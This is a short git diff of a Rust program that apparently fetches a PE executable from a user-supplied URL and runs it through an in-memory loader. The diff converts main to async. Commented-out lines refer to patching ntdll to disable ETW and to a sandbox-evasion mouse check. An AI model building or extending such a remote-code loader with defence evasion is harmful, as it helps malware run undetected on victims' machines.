@@ -6,9 +6,13 @@ mod fetch;
 mod loader;
 mod user_struct;
 
-fn main(){
+#[tokio::main]
+async fn main(){
     println!("[>] Exe who?");
+    //etw::__check_mouse_pointer();
+    
     //new_ntdll_patch_etw().expect("Patching not okie");
+    
     loop {
         println!();
         let url_str = match fetch::fetch_url(){
@@ -39,7 +43,7 @@ fn main(){
         };
 
         // Fetch PE
-        let pe_buf = match fetch::fetch_pe(url) {
+        let pe_buf = match fetch::fetch_pe(url).await  {
             Ok(_v) => _v,
             Err(e) => {
                 eprintln!("[!] Error occurred as: {}", e);
